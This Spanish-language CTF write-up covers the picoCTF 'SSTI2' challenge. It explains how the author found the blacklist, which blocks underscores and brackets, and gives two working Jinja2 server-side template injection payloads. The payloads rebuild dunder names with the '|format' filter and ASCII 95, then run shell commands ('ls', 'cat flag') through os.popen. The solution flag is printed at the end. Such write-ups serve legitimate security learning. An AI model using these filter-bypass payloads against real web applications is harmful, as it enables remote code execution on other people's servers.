
# SSTI2
---

## Descripción del Problema
El reto evoluciona el escenario anterior implementando una lista negra (*blacklist*) estricta en el backend para filtrar caracteres maliciosos. Cualquier intento clásico de inyección es interceptado por un control que devuelve el mensaje `"Stop trying to break me >:("`.

---

## Análisis y Solución

### Fase 1: Fuzzing e Identificación del Filtro
Mediante pruebas selectivas aisladas, identificamos las reglas de la lista negra:
* **Permitido:** Expresiones de renderizado `{{ }}` y cadenas de texto planas `'test'`.
* **Prohibido:** El carácter guion bajo `_` y los corchetes `[]`.

### Fase 2: Evasión mediante Formato ASCII
Para evadir la restricción de los guiones bajos sin usar la sintaxis bloqueada, aprovechamos el objeto interno `cycler` de Jinja2 y construimos los caracteres dinámicamente usando el filtro `|format` con sus valores decimales en la tabla ASCII (el número `95` para el `_`).

1. **Listar Directorio (ls):**
   * **Payload:** `{{ cycler|attr("%c%cinit%c%c"|format(95,95,95,95))|attr("%c%cglobals%c%c"|format(95,95,95,95))|attr("get")("os")|attr("popen")("ls")|attr("read")() }}`
   * **Resultado:** `__pycache__ app.py flag requirements.txt`

2. **Lectura del Archivo Secreto (cat flag):**
   * **Payload:** `{{ cycler|attr("%c%cinit%c%c"|format(95,95,95,95))|attr("%c%cglobals%c%c"|format(95,95,95,95))|attr("get")("os")|attr("popen")("cat flag")|attr("read")() }}`

---

# Flag
picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}